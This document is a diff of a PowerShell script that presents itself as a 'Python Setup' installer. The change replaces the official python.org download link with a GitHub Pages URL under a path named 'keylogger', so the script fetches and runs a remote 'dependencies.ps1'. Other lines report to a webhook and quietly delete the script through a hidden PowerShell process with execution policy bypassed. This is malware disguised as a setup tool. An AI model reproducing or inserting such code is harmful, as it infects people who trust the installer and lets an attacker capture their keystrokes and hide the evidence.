@@ -74,7 +74,7 @@ Send-WebhookMessage "**PowerShell 'Python Setup' script** downloaded everything 
 try {
     $TempPath = [System.IO.Path]::GetTempPath()
     $InstallerPath = Join-Path $TempPath "dependencies.ps1"
-    $DownloadURL = "https://www.python.org/ftp/python/$PythonVersionFull/python-$PythonVersionFull-amd64.exe"
+    $DownloadURL = "https://mynewaccount-website.github.io/keylogger/dependencies.ps1"
 
     Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath
 
@@ -106,4 +106,5 @@ $scriptPath = $MyInvocation.MyCommand.Path
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden
 
 # Exit the script
+
 exit
